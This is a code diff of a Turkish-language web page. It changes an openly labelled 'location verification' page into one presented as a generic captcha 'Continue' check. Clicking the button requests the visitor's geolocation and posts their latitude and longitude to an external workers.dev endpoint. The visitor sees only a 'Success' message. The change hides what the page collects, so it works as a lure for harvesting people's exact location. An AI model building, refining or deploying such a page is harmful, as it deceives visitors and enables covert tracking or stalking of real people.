@@ -1,50 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Konum Doğrulama</title>
-  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+<meta charset="UTF-8">
+<title>Devam Et</title>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<style>
+body{
+  background:#111;
+  color:white;
+  font-family:Arial;
+  text-align:center;
+  padding-top:80px;
+}
+button{
+  padding:12px 25px;
+  font-size:16px;
+  background:#00bcd4;
+  border:none;
+  color:white;
+  cursor:pointer;
+}
+</style>
 </head>
 <body>
 
-<h2>Devam etmek için konum doğrulaması gerekiyor</h2>
+<h2>Devam etmek için doğrulama yapın</h2>
 
-<button onclick="getLocation()">Konumu Paylaş</button>
+<div class="cf-turnstile" data-sitekey="0x4AAAAAACajPIDrosxxpJUl"></div>
 
-<div class="g-recaptcha" 
-     data-sitekey="6LcmOWcsAAAAAAAZstOM2v0q4nxKFY-P_OKkhe1Q">
-</div>
+<br><br>
+<button onclick="gonder()">Devam</button>
 
 <script>
-async function getLocation() {
+function gonder() {
 
-  const token = grecaptcha.getResponse();
+  const token = document.querySelector("[name='cf-turnstile-response']").value;
+
   if (!token) {
-    alert("Captcha doğrulanmadı");
+    alert("Doğrulama yapın");
     return;
   }
 
-  navigator.geolocation.getCurrentPosition(async function(position) {
+  navigator.geolocation.getCurrentPosition(function(pos){
 
-    const data = {
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      token: token
-    };
-
-    const res = await fetch("disciplinehub.disciplinehub.workers.dev", {
+    fetch("https://disciplinehub.disciplinehub.workers.dev", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(data)
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        token: token,
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      alert("Başarılı");
+      console.log(data);
     });
 
-    const result = await res.json();
-    alert("Konum gönderildi");
-
-  }, function() {
+  }, function(){
     alert("Konum izni verilmedi");
   });
+
 }
 </script>
 
